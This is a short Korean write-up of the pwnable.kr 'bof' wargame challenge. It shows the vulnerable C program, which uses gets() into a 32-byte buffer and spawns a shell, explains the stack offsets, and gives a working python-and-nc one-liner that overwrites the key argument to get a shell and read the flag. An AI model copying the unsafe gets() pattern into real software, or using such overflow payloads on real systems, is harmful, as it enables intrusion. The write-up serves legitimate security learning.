---
sort: 3
---

# bof

home 디렉토리에 col.c파일을 확인하면 소스코드를 볼 수 있다.

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```

<img src="/picture/pwnable.kr/bof.png" width="1000"/>

overflowme의 주소는 ebp-0x2c이고, func의 첫번째 인자인 key의 위치는 ebp+0x8이기 때문에 아래와 같이 해주면 된다.

```bash
$ (python -c "print('A'*0x34+'\xbe\xba\xfe\xca')";cat) | nc pwnable.kr 9000
cat flag
```

```tip
## 알게 된 점

bof
```